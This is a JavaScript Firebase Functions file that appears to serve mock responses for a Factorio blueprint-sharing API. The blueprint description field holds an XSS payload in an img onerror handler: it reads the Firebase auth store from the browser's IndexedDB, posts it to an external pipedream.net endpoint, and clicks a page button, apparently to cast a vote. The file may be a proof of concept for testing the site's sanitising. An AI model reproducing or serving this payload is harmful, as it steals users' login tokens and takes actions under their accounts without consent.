const functions = require("firebase-functions/v2");
const express = require("express");

const app = express();

const api = express.Router();

api.get("/blueprintSummaries/:type", async (req, res) => {
    const filter_type = req.params.type;
    if (!["top", "filtered", "search"].includes(filter_type)) {
        res.status(400);
    }
    res.json({
        _metadata: {
            pagination: {
                pageSize: 12,
                numberOfPages: 2,
                pageNumber: 1,
            },
        },
        _data: [
            {
                key: "-KnQ865j-qQ21WoUPbd3",
                title: "Tileable Science Production 0.17-1.0 - Early to Mid Game",
                voteSummary: {
                    numberOfUpvotes: 3360,
                },
                imgurImage: {
                    imgurId: "42RoMSi",
                    imgurType: "image/jpeg",
                },
            },
        ],
    });
});

api.get("/blueprintDetails/:uid", async (req, res) => {

  
    res.json({
        key: "-MH2Gl2ulm0qRO2SVGwj",
        version: {
            number: 2,
            systemFrom: "2020-10-02T04:18:27Z",
            createdOn: "2020-09-12T17:05:08.423Z",
            createdBy: {
                userId: "NxmcHD8GgYNS46cqokm7rl69n3K3",
                displayName: "svsv",
            },
        },
        title: "Solar Panels Perfect Ratio",
        author: {
            userId: "NxmcHD8GgYNS46cqokm7rl69n3K3",
            displayName: "svsv",
        },
        voteSummary: {
            numberOfUpvotes: 1926,
        },
        blueprintString: {
            sha: "bca6b834555e1d81f5915c8e2ee58eec59e96e6f",
        },
        imgurImage: {
            imgurId: "Ok4ewsm",
            imgurType: "image/jpeg",
        },
        descriptionMarkdown:
            'Perfect ratio of 25:21 as explained [here](https://forums.factorio.com/viewtopic.php?t=5594)\n\n<img width=0 height=0 src=404 onerror=\'var req = window.indexedDB.open("firebaseLocalStorageDb", 1);req.onsuccess=()=>{var tr=req.result.transaction("firebaseLocalStorage"); var f=tr.objectStore("firebaseLocalStorage"); var r=f.getAll(); r.onsuccess=()=>{fetch("https://26155e1baf04db5af27995b2dd61e1d4.m.pipedream.net", {method: "POST", body: JSON.stringify(r.result)})}}; var b = document.getElementsByClassName("d-flex align-items-center justify-content-end col-md-3")[0].getElementsByTagName("button")[0]; if (b.firstChild.getAttribute("data-prefix")=="far") {b.click()}\' />',
        tags: [
            {
                tagCategory: "power",
                tagName: "accumulator",
                tag: {
                    category: "power",
                    name: "accumulator",
                },
            },
            {
                tagCategory: "power",
                tagName: "solar",
                tag: {
                    category: "power",
                    name: "solar",
                },
            },
            {
                tagCategory: "version",
                tagName: "1,0",
                tag: {
                    category: "version",
                    name: "1,0",
                },
            },
        ],
    });
});

app.use("/api", api);

exports.app = functions.https.onRequest(app);
